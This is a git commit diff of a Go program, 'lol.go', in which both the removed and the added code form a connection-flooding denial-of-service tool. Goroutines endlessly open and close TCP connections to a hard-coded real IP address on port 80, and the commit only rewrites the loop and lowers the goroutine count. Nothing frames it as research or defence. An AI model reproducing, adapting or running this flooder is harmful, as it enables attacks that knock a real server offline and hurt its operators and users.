1dfee3fded34960bc07078f9a004b482020d4df3
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-18 23:36:52 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -5,30 +5,20 @@ import (
 	"sync"
 )
 
-const (
-	numGoroutines = 10000  // Increase this number to create more goroutines
-	serverIP      = "193.228.196.49"
-	serverPort    = "80"
-)
-
-func connectAndClose(wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	for {
-		conn, err := net.Dial("tcp", net.JoinHostPort(serverIP, serverPort))
-		if err != nil {
-			continue
-		}
-		conn.Close()
-	}
-}
-
 func main() {
 	var wg sync.WaitGroup
 
-	for i := 0; i < numGoroutines; i++ {
+	for i := 0; i < 100; i++ {
 		wg.Add(1)
-		go connectAndClose(&wg)
+		go func() {
+			defer wg.Done()
+			for {
+				conn, _ := net.Dial("tcp", "193.228.196.49:80")
+				if conn != nil {
+					conn.Close()
+				}
+			}
+		}()
 	}
 
 	wg.Wait()
